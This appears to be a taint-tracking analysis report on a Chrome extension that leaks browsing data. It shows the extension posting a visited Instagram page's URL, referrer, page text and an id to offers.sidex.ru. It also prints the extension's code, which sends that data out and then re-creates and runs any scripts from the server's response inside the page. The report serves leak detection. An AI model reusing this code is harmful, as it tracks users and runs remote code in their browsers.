@@ -1,0 +1,153 @@
+>>> TAINT SINK `XHR` REACHED (xml-send-body-USVString) <<<
+STACK TRACE START: 
+0x247effece5f1 <String[217]: c"get (chrome-extension://aamfmnhcipnbjjnbfmaoooiohikifefk/background.js:86:8)chrome-extension://aamfmnhcipnbjjnbfmaoooiohikifefk/background.js:105:7chrome-extension://aamfmnhcipnbjjnbfmaoooiohikifefk/background.js:24:5">
+STACK TRACE END.
+
+///////////////////////// Details /////////////////////////
+
+** XHR leak, request URL = https://offers.sidex.ru/SidexPriceScanner.php
+
+** Tainted bytes: (nullptr=1): 
+
+** Sink object: json=%7B%22site%22%3A%22www.instagram.com%22%2C%22url%22%3A%22https%3A%2F%2Fwww.instagram.com%2Fxqgtiti%2F%22%2C%22ref%22%3A%22%22%2C%22name%22%3A%22This%20is%20me!!!!%22%2C%22shop_id%22%3A%22%22%2C%22browser%22%3A%22Google%20Chrome%22%2C%22version%22%3A%223.36%22%2C%22geo_id%22%3A%22%22%2C%22sort%22%3A%22%22%2C%22uniq_id%22%3A%22eijxpudsfkwctiwclaypmvgft%22%7D
+
+** Propagation paths: 
+
+0x247effecdcc1 <String[363]: c"json=%7B%22site%22%3A%22www.instagram.com%22%2C%22url%22%3A%22https%3A%2F%2Fwww.instagram.com%2Fxqgtiti%2F%22%2C%22ref%22%3A%22%22%2C%22name%22%3A%22This%20is%20me!!!!%22%2C%22shop_id%22%3A%22%22%2C%22browser%22%3A%22Google%20Chrome%22%2C%22version%22%3A%223.36%22%2C%22geo_id%22%3A%22%22%2C%22sort%22%3A%22%22%2C%22uniq_id%22%3A%22eijxpudsfkwctiwclaypmvgft%22%7D">:
+  0x33fbf77154e9 <Object map = 0x2cfb263a7b79>, in function 58166533864585 `get`: 1280, 1460
+
+0x33fbf77154e9 <Object map = 0x2cfb263a7b79>:
+  0x2cfb2639f759 <String[14]: e"This is me!!!!">, in function 60790046917905 ``: 6762, 6874
+
+0x2cfb2639f759 <String[14]: e"This is me!!!!">:
+
+
+** Taint source objects:
+
+
+** Propagation path functions: 
+
+0x3749c9270511 <JSFunction (sfi = 0xe58b871d39)> ``: 6762
+(s)
+   {
+    if(s)
+     {
+      var e = document.querySelector(s);
+      var name = get_text(e);
+      if(name)
+       {
+        var json = {site:host,url:url,ref:document.referrer,name:name,shop_id:'',browser:browser,version:version};
+        get_offer(json,retargeting);
+        return true;
+       }
+     }
+    
+    db_get('url',function(s)
+     {
+      if(s)
+       {
+        var e = document.querySelector(s);
+        var name = get_text(e);
+        if(name)
+         {
+          var json = {site:host,url:url,ref:document.referrer,name:name,shop_id:'',browser:browser,version:version};
+          get_offer(json,retargeting);
+          return true;
+         }
+       }
+       
+       retargeting();
+     });
+   }
+0x33fbf7727f19 <JSFunction (sfi = 0x2cfb263a4999)> ``: 2038
+(s2)
+     {
+      dat.sort = '';
+      if(s2){dat.sort=s2;}
+      dat.uniq_id = uniq_id;
+      get('https://'+source_site+'/SidexPriceScanner.php',dat,function(s)
+       {
+        var a = document.querySelector('#'+uniq_id);
+        if(!a)
+         {
+          var e = document.createElement('div');
+          e.setAttribute('style','display: block !important; border: 0 !important; outline: 0 !important; padding: 0 !important; margin: 0 !important; opacity: 1 !important; height:0; transition: height 0.4s ease;');
+          var a = document.createElement('div');
+          a.setAttribute('style','border: 0 !important; outline: 0 !important; padding: 0 !important; margin: 0 !important; opacity: 1 !important; display: block !important; position: fixed; left: 0px; right: 0px; width: 100% !important; z-index: 999999999 !important; overflow: auto !important; visibility: visible !important; background-color: transparent; height: 60px; top: -60px; transition: top 0.4s ease;');
+          a.setAttribute('id',uniq_id);
+          e.appendChild(a);
+          document.body.insertBefore(e,document.body.firstChild);
+         }
+        a.innerHTML = s;
+        if(!s)
+         {
+          if(typeof fn=='function')
+           {
+            fn();
+           }
+          return false;
+         }
+        
+        var d = a.querySelectorAll('script');
+        var c = d.length;
+        for(var i=0;i<c;i++)
+         {
+          var r = d[i];
+          var e = document.createElement('script');
+          e.innerHTML = r.innerHTML;
+          var s = r.getAttribute('src');
+          if(s)
+           {
+            e.setAttribute('src',s);
+           }
+          r.parentNode.removeChild(r);
+          a.appendChild(e);
+         }
+        bar_open();
+       },true);
+     }
+0x34e6f396bc89 <JSFunction get (sfi = 0x34e6f3969329)> `get`: 1280
+(url,post,fn,not_json)
+ {
+  var ajax = new XMLHttpRequest();
+  var method = 'GET';
+  if(post)
+   {
+    method = 'POST';
+    post = 'json='+encodeURIComponent(JSON.stringify(post));
+   }
+  ajax.open(method,url);
+  ajax.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+  ajax.onreadystatechange = function()
+   {
+    if(ajax.readyState==4)
+     {
+      var r = ajax.responseText;
+      if(typeof not_json=='undefined')
+       {
+        r = JSON.parse(r);
+       }
+      if(fn){fn(r);}else{return r;}
+     }
+   }
+  ajax.send(post);
+ }
+0x34e6f396bd59 <JSFunction get_text (sfi = 0x34e6f3969699)> `get_text`: 3886
+(e)
+ {
+  var name = '';
+  if(e)
+   {
+    name = e.innerText;
+    if(!name)
+     {
+      name = e.getAttribute('content');
+     }
+   }
+  return name;
+ }
+
+** Taint source functions: 
+
+
+>>> END TAINT SINK REPORT <<<
